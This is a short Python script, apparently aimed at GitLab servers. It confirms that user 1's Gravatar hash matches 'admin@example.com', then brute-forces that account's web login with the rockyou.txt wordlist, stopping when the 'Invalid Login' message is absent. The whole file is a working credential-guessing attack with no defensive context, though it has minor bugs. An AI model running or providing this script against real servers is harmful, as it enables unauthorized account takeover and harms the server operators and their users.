from requests import get,post
from hashlib import md5
from re import findall

domain = ''

r = get(domain+'/api/v4/users/1').json()
email = findall('([a-z0-9]{32})', r['avatar_url'])[0]

a = True if str((md5("admin@example.com".encode())).hexdigest()) == str(email) else False

if a:
    print("Standart user found, trying brute...")
    for i in open('rockyou.txt').readlines():
        tmp = post(domain+'/users/sign_in', data={'user_login':'admin@example.com', 'user_password':i}).text
        if 'Invalid Login or password.' not in tmp:
            print("Success! Password: {i}".format(i))
            exit(0)
    print('No password found :(')
else:
    print("Standart user not found.")
